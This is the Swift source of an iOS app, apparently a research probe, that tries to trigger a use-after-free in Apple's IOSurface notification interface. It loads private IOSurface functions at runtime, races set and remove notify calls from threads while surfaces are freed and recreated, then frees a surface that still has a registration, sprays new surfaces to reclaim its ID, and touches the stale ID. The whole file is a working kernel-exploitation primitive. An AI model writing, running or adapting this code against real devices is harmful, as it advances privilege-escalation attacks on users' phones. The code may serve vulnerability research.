import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v71 - IOSurface notify UAF probe (Swift port)").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v71")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    private func hex(_ v: UInt64) -> String { "0x" + String(v, radix: 16) }

    private func release(_ ptr: UnsafeMutableRawPointer?) {
        guard let p = ptr else { return }
        Unmanaged<AnyObject>.fromOpaque(p).release()
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v71 - IOSurface notify UAF probe (Swift port) ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) else {
            emit("[-] dlopen IOSurface failed"); status = "Complete"; isRunning = false; return
        }
        emit("[*] dlopen IOSurface OK")

        guard let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] one or more symbols missing"); status = "Complete"; isRunning = false; return
        }
        emit("[*] all symbols resolved")

        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[*] notify port 0x\(String(gPort, radix: 16)) (kr=0x\(String(kr, radix: 16)))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        var keyCB = kCFTypeDictionaryKeyCallBacks
        var valCB = kCFTypeDictionaryValueCallBacks
        let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
        props["IOSurfaceWidth"] = 256
        props["IOSurfaceHeight"] = 256
        props["IOSurfaceBytesPerElement"] = 4

        emit("[*] creating surface...")
        var surf: UnsafeMutableRawPointer? = gCreate(props)
        emit("[*] gCreate returned: \(surf != nil)")
        guard let s = surf else {
            emit("[-] IOSurfaceCreate failed"); status = "Complete"; isRunning = false; return
        }
        let sid = gGetID(s)
        emit("[+] surface id 0x\(String(sid, radix: 16))")

        // Test both argument orders
        for order in 0...1 {
            let a: kern_return_t
            if order == 0 { a = gSet(gPort, UInt64(sid), 1) }
            else { a = gSet(gPort, 1, UInt64(sid)) }
            let b = gRemove(UInt64(sid))
            emit("[*] order=\(order) set=0x\(String(a, radix: 16)) remove=0x\(String(b, radix: 16))")
        }

        // Sequential pairs on stable surface
        emit("[*] sequential pairs on stable surface")
        for i in 0..<5 {
            let a = gSet(gPort, 1, UInt64(sid))
            let b = gRemove(UInt64(sid))
            emit("[seq \(i)] set=0x\(String(a, radix: 16)) remove=0x\(String(b, radix: 16))")
        }

        // Race: release surface while threads hammer set/remove
        emit("[*] race: set during release")
        var gStop = false
        var gSurfaceID: UInt32 = sid

        let sema1 = DispatchSemaphore(value: 0)
        let sema2 = DispatchSemaphore(value: 0)

        DispatchQueue.global().async {
            while !gStop {
                let s = gSurfaceID
                if s == 0 { continue }
                _ = gSet(gPort, 1, UInt64(s))
            }
            sema1.signal()
        }

        DispatchQueue.global().async {
            while !gStop {
                let s = gSurfaceID
                if s == 0 { continue }
                _ = gRemove(UInt64(s))
            }
            sema2.signal()
        }

        for i in 0..<400 {
            usleep(2000)
            release(surf)
            guard let newSurf = gCreate(props) else {
                emit("[-] recreate failed at \(i)"); break
            }
            surf = newSurf
            gSurfaceID = gGetID(surf!)
            if i % 50 == 0 { emit("[*] iteration \(i), surface 0x\(String(gSurfaceID, radix: 16))") }
        }

        gStop = true
        sema1.wait()
        sema2.wait()
        emit("[*] race phase complete")

        // Phase A: register, drop surface without remove, spray
        emit("[*] phase A: register, drop surface, spray")
        let aSurf: UnsafeMutableRawPointer? = gCreate(props)
        if let aSurf = aSurf {
            let ida = gGetID(aSurf)
            let setKr = gSet(gPort, 1, UInt64(ida))
            emit("[A] surface 0x\(String(ida, radix: 16)) set=0x\(String(setKr, radix: 16))")
            release(aSurf)
            emit("[A] released without remove")

            let SPRAY = 48
            var keep: [UnsafeMutableRawPointer?] = []
            for _ in 0..<SPRAY {
                if let s2 = gCreate(props) { keep.append(s2) }
            }
            emit("[*] sprayed \(keep.count) surfaces")
            var foundReuse = false
            for s2 in keep {
                if let s2 = s2 {
                    let sid2 = gGetID(s2)
                    if sid2 == ida {
                        emit("[*] sprayed surface landed on id 0x\(String(ida, radix: 16))")
                        foundReuse = true
                    }
                }
            }

            emit("[B] touching stale id 0x\(String(ida, radix: 16)) after spray")
            let rs = gSet(gPort, 1, UInt64(ida))
            emit("[B] set    = 0x\(String(rs, radix: 16))")
            let rr = gRemove(UInt64(ida))
            emit("[B] remove = 0x\(String(rr, radix: 16))")
            let rs2 = gSet(gPort, 1, UInt64(ida))
            emit("[B] set again = 0x\(String(rs2, radix: 16))")

            for s2 in keep { release(s2) }
        }

        emit("[*] probe finished")
        status = "Complete"; isRunning = false
    }
}
